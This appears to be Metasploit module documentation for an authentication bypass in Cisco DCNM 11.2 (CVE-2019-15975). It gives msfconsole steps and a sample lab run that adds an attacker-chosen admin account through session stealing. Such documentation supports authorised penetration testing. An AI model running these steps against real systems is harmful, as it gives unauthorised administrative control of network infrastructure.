## Description

This module exploits CVE-2019-15975 which affects Cisco DCNM versions 11.2 up to but not including 11.3(1). This exploit
adds an admin account with any credentials you want. Then you can login to the web interface of Cisco DCNM with those
credentials. The only necessary condition is the more or less recent connection (probably something like within the last
hours) of an admin as this exploit uses a kind of session stealing.

## Installation

A vulnerable version of Cisco DCNM can be downloaded from
[here](https://software.cisco.com/download/home/281722751/type/282088134/release/11.2(1)). Then follow all the steps in
the installation interface. You might have to set up a database if the auto installation of PostgreSQL fails for
instance (that was my case and I finally had to manually install PostgreSQL).

## Verification Steps

List the steps needed to make sure this thing works

1. Start `msfconsole`
2. `use auxiliary/admin/networking/cisco_dcnm_auth_bypass`
3. `set RHOST <target_host>`
4. `check` to check if the targeted Cisco DCNM is vulnerable
5. `set USERNAME <username>` and `set PASSWORD <password>` to specify the credentials you want to add
6. `run` the module to exploit the CVE and add an admin account with those credentials

## Options

**RHOSTS**

Set the target host.

**USERNAME**

Set the USERNAME of the admin account you want to add.

**PASSWORD**

Set the PASSWORD of the admin account you want to add.

**RETRIES**

You can change the maximum number of attempts to add an admin account by using `set RETRIES <max_retries>`.

## Scenarios

### DCNM 11.2(1) - Linux OVA Appliance

```
msf6 > use auxiliary/admin/networking/cisco_dcnm_auth_bypass
msf6 auxiliary(admin/networking/cisco_dcnm_auth_bypass) > set RHOST 192.168.159.33
RHOST => 192.168.159.33
msf6 auxiliary(admin/networking/cisco_dcnm_auth_bypass) > check
[+] 192.168.159.33:443 - The target is vulnerable.
msf6 auxiliary(admin/networking/cisco_dcnm_auth_bypass) > run
[*] Running module against 192.168.159.33

[+] Admin account with username: 'frederick' and password: '1OwNqJnO' added!
[*] Auxiliary module execution completed
msf6 auxiliary(admin/networking/cisco_dcnm_auth_bypass) >
```
